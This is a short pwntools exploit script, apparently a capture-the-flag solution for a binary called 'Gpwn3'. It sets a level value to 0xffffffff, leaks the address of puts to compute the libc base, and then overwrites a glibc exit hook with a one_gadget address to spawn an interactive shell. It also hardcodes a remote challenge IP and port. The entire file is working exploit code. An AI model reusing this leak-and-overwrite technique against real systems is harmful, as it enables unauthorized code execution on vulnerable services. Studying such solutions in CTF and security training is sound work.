from pwn import *

import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['/bin/tmux','splitw','-h']
IP="113.201.14.253"
port=16033
file_name = "./Gpwn3"
try:
    libc_path = "/home/yrl/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"
    libc = ELF(libc_path)
except:
    pass
menu = "You choice:"
elf=ELF(file_name)
if debug:
    sh = process(file_name)
else:
    sh = remote(IP,port)
def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sh.recvuntil(menu)
    sh.sendline(str(choice))

def create(payload):
    cmd(1)
    sh.sendlineafter("Give me a character level :\n",payload)

def leaveup(payload):
    cmd(2)
    sh.sendlineafter("Give me another level :\n",payload)

def play():
    cmd(3)
create('a'*35)
leaveup('a')
leaveup(p32(0xffffffff))
play()
sh.recvuntil("Here's your reward: ")
put_addr = int(sh.recv(14),16)
libc_base = put_addr - libc.sym['puts']
log.info("libc_base=>{}".format(hex(libc_base)))
exit_hook = libc_base + 0x5f0f48
one = libc_base + 0xf1247
sh.sendafter("Warrior,please leave your name:",p64(exit_hook))
sh.sendafter("We'll have a statue made for you!",p64(one))

sh.interactive()
